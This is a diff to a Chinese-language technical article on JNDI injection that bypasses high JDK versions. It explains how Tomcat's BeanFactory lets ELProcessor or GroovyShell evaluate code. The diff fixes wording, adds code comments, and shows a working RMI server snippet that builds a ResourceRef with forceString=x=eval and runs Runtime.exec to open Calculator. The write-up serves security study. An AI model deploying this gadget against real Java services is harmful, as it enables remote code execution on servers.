@@ -20,7 +20,7 @@ LADP利用JDK版本≤ 6u211 、7u201、8u191
 * 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对他反序列化，由此完成利用
 
 因此具体实现上，大概三种利用方式比较常见：
-* 无法加载远程Factory工厂类，但不影响加载本地classpath中的Factory，条件是：工厂类必须实现了`javax.naming.sp.ObjectFactory`接口，并且至少存在一个getPbejct方法。比如：`org.apache.naming.factory.BeanFactory`（需要Tomcat的catalina.jar依赖，使用相对广泛）。以此调用`javax.el.ELProcessor#eval`或`groovy.lang.GroovyShell#evaluate`方法。
+* 无法加载远程Factory工厂类，但不影响加载本地classpath中的Factory，条件是：工厂类必须实现了`javax.naming.sp.ObjectFactory`接口，并且至少存在一个`getObejctInstance`方法。比如：`org.apache.naming.factory.BeanFactory`（需要Tomcat的catalina.jar依赖，使用相对广泛）。以此调用`javax.el.ELProcessor#eval`或`groovy.lang.GroovyShell#evaluate`方法。
 * 另外通过LDAP的javaSerializedData反序列化Gadget（不过这不在本文讨论范围内）
 
 ---
@@ -93,12 +93,12 @@ public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtabl
     if (obj instanceof ResourceRef) {
         try {
             Reference ref = (Reference)obj;
-            String beanClassName = ref.getClassName();
+            String beanClassName = ref.getClassName();  // 获取类名
             Class<?> beanClass = null;
             ClassLoader tcl = Thread.currentThread().getContextClassLoader();
             if (tcl != null) {
                 try {
-                    beanClass = tcl.loadClass(beanClassName);
+                    beanClass = tcl.loadClass(beanClassName);  // 类加载
                 } catch (ClassNotFoundException var26) {
                 }
             } else {
@@ -202,6 +202,7 @@ public Object evaluate(String scriptText) throws CompilationFailedException {
 
 因此在RMIServer端构造的代码类似：
 ```java
+// 完整代码见于：RMIServerELProcessor
 ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
 ref.add(new StringRefAddr("forceString", "x=eval"));
 ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('open /System/Applications/Calculator.app')\")"));
